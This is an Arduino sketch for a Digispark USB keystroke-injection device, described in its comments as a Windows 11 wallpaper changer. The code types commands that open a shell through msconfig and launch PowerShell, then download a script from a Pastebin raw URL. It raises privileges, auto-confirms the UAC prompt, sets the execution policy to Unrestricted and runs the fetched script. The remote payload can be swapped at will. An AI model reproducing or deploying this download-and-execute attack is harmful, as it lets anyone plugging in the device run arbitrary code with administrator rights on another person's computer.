// Changes wallpaper to whatever you want.
// Tested working Windows 11. 
// Change the link to the image you want to use in jpg form.
#include "DigiKeyboard.h"
#define link "https://www.mannapro.com/sites/default/files/2023-09/15.png"
#define KEY_DOWN 0x51
void setup() {
  pinMode(1, OUTPUT); // LED Setup
}
void loop() {
  DigiKeyboard.sendKeyStroke(KEY_D, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  digitalWrite(1, HIGH); // Turn on LED to signify task started
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);

 DigiKeyboard.println("msconfig -5"); // Access CMD
    DigiKeyboard.delay(1000); 
    for(int i = 0; i < 14; i++) {
        DigiKeyboard.sendKeyStroke(KEY_DOWN);
    }
  DigiKeyboard.sendKeyStroke(KEY_L, MOD_ALT_LEFT);
  DigiKeyboard.delay(1000);

  DigiKeyboard.println("powershell");
  DigiKeyboard.delay(300);
  DigiKeyboard.println("$path = \"$env:USERPROFILE\\script2.ps1\"");
  DigiKeyboard.println("$client = new-object System.Net.WebClient");
  DigiKeyboard.println("Remove-Item $path -ErrorAction SilentlyContinue");
  DigiKeyboard.delay(500);
  // MAKE SURE TO UPDATE THIS PASTEBIN ACCORDING TO THE SCRIPT.PS1
  DigiKeyboard.print("$client.DownloadFile(\"https://pastebin.com/raw/GaccCRrz\", $path)");
  DigiKeyboard.delay(1000);

  DigiKeyboard.println("powershell Start-Process cmd -Verb runAs");
  DigiKeyboard.delay(750);
  DigiKeyboard.sendKeyStroke(MOD_ALT_LEFT, KEY_Y);
  DigiKeyboard.delay(750);
  DigiKeyboard.println("powershell Set-ExecutionPolicy 'Unrestricted' -Scope CurrentUser -Confirm:$false");
  DigiKeyboard.delay(750);

  DigiKeyboard.print("powershell.exe -File %USERPROFILE%\\script2.ps1");

  digitalWrite(1, LOW);
  for(;;){}
}
